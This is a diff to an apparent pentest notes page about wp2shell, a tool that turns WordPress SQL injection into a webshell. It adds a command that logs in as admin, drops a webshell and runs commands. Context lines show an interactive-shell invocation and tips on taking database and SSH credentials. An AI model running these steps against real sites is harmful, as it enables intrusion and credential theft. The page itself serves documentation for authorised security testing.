@@ -5,7 +5,7 @@ tags: [wordpress, sqli, rce, webshell, exploitation, tool, web]
 date_created: 2026-08-20
 date_updated: 2026-08-20
 sources: [gh-icex0-wp2shell]
-phase: exploitation
+phase: exploit
 ---
 
 ## Purpose
@@ -64,3 +64,11 @@ python3 wp2shell.py shell -i http://target            # interactive shell after 
 - [[sql-injection]] - the underlying injection class.
 - [[file-upload]] / webshell delivery - the RCE stage.
 - WordPress post-ex: DB creds in `wp-config.php`; **check for non-standard `wp_*` tables** (custom tables often hold infra/SSH creds).
+
+## Core usage
+
+Authenticate as an admin and drop a webshell to run a command:
+
+```bash
+python3 wp2shell.py shell --user <admin> --password '<pass>' --cmd 'id; hostname' http://target
+```
